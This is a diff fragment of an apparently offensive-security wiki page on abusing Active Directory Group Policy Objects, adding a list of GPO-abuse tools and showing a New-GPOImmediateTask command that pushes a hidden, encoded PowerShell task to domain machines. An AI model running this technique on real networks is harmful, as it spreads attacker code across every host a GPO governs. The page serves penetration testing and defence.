@@ -16,9 +16,11 @@ In certain scenarios, an attacker can gain control over GPOs. Some ACEs can give
 
 ## Practice
 
+GPO-based attacks can be conducted with [New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\), [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) \(C\#\), or [pyGPOabuse](https://github.com/Hackndo/pyGPOAbuse) \(python\) for UNIX-like systems.
+
 ### Immediate Scheduled Task
 
-An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to. This can be achieved with [New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).
+An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to.
 
 ```bash
 New-GPOImmediateTask -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command powershell -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMA[...]BOz4=='
